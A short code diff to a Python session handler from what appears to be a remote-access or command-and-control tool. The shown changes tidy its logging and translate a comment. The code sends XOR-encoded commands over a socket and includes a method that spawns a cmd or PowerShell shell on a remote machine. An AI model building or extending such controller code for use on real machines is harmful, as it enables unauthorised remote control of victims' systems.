@@ -68,20 +68,19 @@ class Session:
                 cmd += " "
             else:
                 cmd += char
-
        
-        printColor("information","go send XOR cmd.{}".format(cmd))
         if(CheckConn().sendsafe(self.session_nb, self.socket, cmd)): #send data
-            print("SEND")
-            printColor("successfully",CheckConn().recvcommand(self.socket,4096)) #XOR  The decryption of xor is automatic on this method.
+        
+            CheckConn().recvcommand(self.socket,4096) #XOR  The decryption of xor is automatic on this method.
+            
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
         
     def spawnShell(self,prog):
         '''--command or --powershell'''
 
-        #Ouvre un shell sur la machine distante.
-        printColor("help","\n[?] Execute -b or --back to return to sessions mode.\n\n") 
+        #Opens a shell on the remote machine. 
+        printColor("information","\n[?] Execute -b or --back to return to sessions mode.\n\n") 
         
         if(CheckConn().sendsafe(self.session_nb, self.socket, "MOD_SPAWN_SHELL:"+prog) ):
             FakeCmd(self.socket).main() #Run cmd
